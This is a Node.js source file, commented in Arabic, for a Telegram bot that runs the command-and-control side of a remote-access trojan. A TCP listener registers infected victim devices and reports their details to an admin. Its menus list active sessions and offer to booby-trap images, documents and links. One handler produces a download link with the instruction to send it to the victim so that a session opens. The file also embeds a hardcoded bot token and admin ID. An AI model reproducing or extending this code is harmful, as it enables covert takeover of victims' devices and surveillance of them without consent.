const { Telegraf, Markup } = require('telegraf');
const net = require('net');

const TOKEN = "7745042123:AAHERMo9DzTcxSQ7ZtQgF_faQAnD6BngDRw";
const ADMIN_ID = 6654753506; 
const PORT = 10000;

let activeAgents = {}; 
const bot = new Telegraf(TOKEN);

// --- 1. خادم الاستقبال (C2 Server) ---
const server = net.createServer((socket) => {
    socket.once('data', (data) => {
        try {
            const info = JSON.parse(data.toString());
            const agentId = info.hostname || `Device_${Math.floor(Math.random()*1000)}`;
            activeAgents[agentId] = { socket, info };

            bot.telegram.sendMessage(ADMIN_ID, 
                `✅ **جـلسة جـديدة نـشطة!**\n\n` +
                `📱 الجهاز: ${info.hostname}\n` +
                `🔋 البطارية: ${info.battery}%\n` +
                `🖥️ النظام: ${info.platform}\n` +
                `🔌 الشحن: ${info.charging ? 'متصل' : 'غير متصل'}`, { parse_mode: 'Markdown' });
        } catch (e) { console.log("Init Error"); }
    });
    socket.on('error', () => {});
    socket.on('close', () => {});
});
server.listen(PORT, '0.0.0.0');

// --- 2. القائمة الرئيسية ---
bot.start((ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    ctx.reply('🛡️ مركز التحكم والمزامنة جاهز:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('📱 الجلسات المفتوحة', 'list_agents')],
            [Markup.button.callback('🛠️ أدوات التلغيم', 'payload_tools')]
        ])
    );
});

// --- 3. معالجة زر أدوات التلغيم (الذي كان لا يعمل) ---
bot.action('payload_tools', (ctx) => {
    ctx.answerCbQuery(); // لإزالة علامة التحميل من الزر
    ctx.reply('🛠️ **قـائمة التـلغيم والمزامنة:**\nاختر نوع الملف الذي تريد تلغيمه ليرسله لك البوت جاهزاً:', 
        Markup.inlineKeyboard([
            [Markup.button.callback('🖼️ تلغيم صورة (JPG/PNG)', 'bind_img')],
            [Markup.button.callback('🔗 إنشاء رابط ملغم', 'bind_link')],
            [Markup.button.callback('📄 تلغيم ملف (PDF/DOC)', 'bind_doc')]
        ])
    );
});

// --- 4. معالجة الجلسات والتحكم ---
bot.action('list_agents', (ctx) => {
    ctx.answerCbQuery();
    const ids = Object.keys(activeAgents);
    if (ids.length === 0) return ctx.reply("❌ لا توجد أجهزة متصلة.");
    
    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم: ${id} (${activeAgents[id].info.battery}%)`, `manage_${id}`)]);
    ctx.reply("🌐 الجلسات النشطة:", Markup.inlineKeyboard(buttons));
});

// معالجات فرعية للأدوات (كمثال)
bot.action('bind_link', (ctx) => {
    ctx.reply(`🔗 الرابط الملغم جاهز:\nhttps://${ctx.me}.onrender.com/download\n\nأرسله للضحية، وبمجرد التحميل ستفتح الجلسة.`);
});

bot.launch();
